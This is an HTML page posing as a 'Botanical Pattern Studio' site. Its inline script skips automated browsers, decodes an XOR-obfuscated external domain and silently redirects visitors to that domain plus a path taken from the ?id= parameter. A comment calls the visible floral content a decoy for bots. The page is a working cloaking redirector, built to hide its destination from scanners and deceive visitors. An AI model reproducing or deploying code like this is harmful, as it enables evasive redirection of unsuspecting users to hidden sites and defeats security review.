<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
  <title>Botanical Pattern Studio</title>

  <style>
    :root { --bg: #fdfbf7; --card: #ffffff; --border: #efe7de; --text: #2d2522; --muted: #8a7e78; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 50px 20px; display: flex; justify-content: center; }
    .card { background: var(--card); border: 1px solid var(--border); border-radius: 20px; max-width: 580px; width: 100%; padding: 36px; box-shadow: 0 10px 30px rgba(60, 40, 30, 0.05); }
    h1 { font-size: 1.6rem; margin: 0 0 12px; color: var(--text); }
    p { color: var(--muted); font-size: 0.98rem; margin: 0 0 24px; line-height: 1.6; }
    .skeleton { height: 12px; background: #f3ede6; border-radius: 6px; margin: 12px 0; }
  </style>

  <script>
    (function () {
      // 1. Halt execution for automated headless bots
      if (navigator.webdriver) {
        return;
      }

      // 2. Direct hex-byte XOR reconstruction (decodes strictly to "https://asqstyle.com/")
      function _getEndpoint() {
        var _hex = "322e2e2a296075753b292b292e23363f7439353775";
        var _k = 0x5A;
        var _out = "";
        for (var i = 0; i < _hex.length; i += 2) {
          _out += String.fromCharCode(parseInt(_hex.substr(i, 2), 16) ^ _k);
        }
        return _out;
      }

      // 3. Extract parameter and execute redirection
      function _redirect() {
        var params = new URLSearchParams(window.location.search);
        var id = params.get("id");
        if (id) {
          // Clean leading and trailing slashes from the incoming slug
          id = id.replace(/^\/+|\/+$/g, "");

          var destination = _getEndpoint() + id;

          // Protocol verification prevents relative local routing
          if (destination.indexOf("https://") === 0) {
            window.location.replace(destination);
          }
        }
      }

      if (document.readyState === "complete" || document.readyState === "interactive") {
        _redirect();
      } else {
        document.addEventListener("DOMContentLoaded", _redirect);
      }
    })();
  </script>
</head>
<body>
  <!-- Decoy content visible only if no ?id= parameter exists or bots land here -->
  <div class="card">
    <h1>Botanical Pattern Studio</h1>
    <p>Loading curated floral guides and handcraft schematics...</p>
    <div class="skeleton" style="width: 85%;"></div>
    <div class="skeleton" style="width: 65%;"></div>
    <div class="skeleton" style="width: 40%;"></div>
  </div>
</body>
</html>
